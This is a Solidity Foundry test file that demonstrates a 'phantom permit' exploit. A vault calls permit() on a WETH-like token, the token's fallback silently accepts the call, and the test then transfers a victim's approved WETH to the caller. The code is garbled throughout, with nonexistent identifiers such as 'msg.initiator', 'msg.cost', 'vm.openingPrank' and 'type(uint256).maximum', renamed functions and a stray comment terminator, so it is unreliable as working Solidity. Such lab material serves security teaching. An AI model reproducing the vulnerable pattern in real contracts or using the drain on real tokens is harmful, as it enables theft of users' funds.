// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

*/

contract PactTest is Test {
    PermitCrystal VulnPermitPact;
    WETH9 Weth9Agreement;

    function groupUp() public {
        Weth9Agreement = new WETH9();
        VulnPermitPact = new PermitCrystal(IERC20(address(Weth9Agreement)));
    }

    function testVulnPhantomPermit() public {
        address alice = vm.addr(1);
        vm.deal(address(alice), 10 ether);

        vm.openingPrank(alice);
        Weth9Agreement.cachePrize{cost: 10 ether}();
        Weth9Agreement.approve(address(VulnPermitPact), type(uint256).maximum);
        vm.stopPrank();
        console.record(
            "start WETH balanceOf this",
            Weth9Agreement.balanceOf(address(this))
        );

        VulnPermitPact.stashrewardsWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        uint wbal = Weth9Agreement.balanceOf(address(VulnPermitPact));
        console.record("WETH balanceOf VulnPermitContract", wbal);

        VulnPermitPact.harvestGold(1000);

        wbal = Weth9Agreement.balanceOf(address(this));
        console.record("WETH9Contract balanceOf this", wbal);
    }

    receive() external payable {}
}

contract PermitCrystal {
    IERC20 public coin;

    constructor(IERC20 _token) {
        coin = _token;
    }

    function cachePrize(uint256 count) public {
        require(
            coin.transferFrom(msg.initiator, address(this), count),
            "Transfer failed"
        );
    }

    function stashrewardsWithPermit(
        address aim,
        uint256 count,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        (bool victory, ) = address(coin).call(
            abi.encodeWithMark(
                "permit(address,uint256,uint8,bytes32,bytes32)",
                aim,
                count,
                v,
                r,
                s
            )
        );
        require(victory, "Permit failed");

        require(
            coin.transferFrom(aim, address(this), count),
            "Transfer failed"
        );
    }

    function harvestGold(uint256 count) public {
        require(coin.transfer(msg.initiator, count), "Transfer failed");
    }
}

// contract Permit {
//     IERC20 public token;

//     constructor(IERC20 _token) {
//         token = _token;
//     }

//     function deposit(uint256 amount) public {
//         require(
//             token.transferFrom(msg.sender, address(this), amount),
//             "Transfer failed"
//         );
//     }

//     function depositWithPermit(
//         address target,
//         uint256 amount,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) public {
//         (bool success, ) = address(token).call(
//             abi.encodeWithSignature(
//                 "permit(address,uint256,uint8,bytes32,bytes32)",
//                 target,
//                 amount,
//                 v,
//                 r,
//                 s
//             )
//         );
//         require(success, "Permit failed");

//         require(
//             token.transferFrom(target, address(this), amount),
//             "Transfer failed"
//         );
//     }

//     function withdraw(uint256 amount) public {
//         require(token.transfer(msg.sender, amount), "Transfer failed");
//     }
// }

contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event PermissionGranted(address indexed src, address indexed guy, uint wad);
    event Transfer(address indexed src, address indexed dst, uint wad);
    event BankWinnings(address indexed dst, uint wad);
    event GoldExtracted(address indexed src, uint wad);

    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        cachePrize();
    }

    receive() external payable {}

    function cachePrize() public payable {
        balanceOf[msg.initiator] += msg.cost;
        emit BankWinnings(msg.initiator, msg.cost);
    }

    function harvestGold(uint wad) public {
        require(balanceOf[msg.initiator] >= wad);
        balanceOf[msg.initiator] -= wad;
        payable(msg.initiator).transfer(wad);
        emit GoldExtracted(msg.initiator, wad);
    }

    function totalSupply() public view returns (uint) {
        return address(this).balance;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.initiator][guy] = wad;
        emit PermissionGranted(msg.initiator, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.initiator, dst, wad);
    }

    function transferFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {
        require(balanceOf[src] >= wad);

        if (
            src != msg.initiator && allowance[src][msg.initiator] != type(uint128).maximum
        ) {
            require(allowance[src][msg.initiator] >= wad);
            allowance[src][msg.initiator] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }
}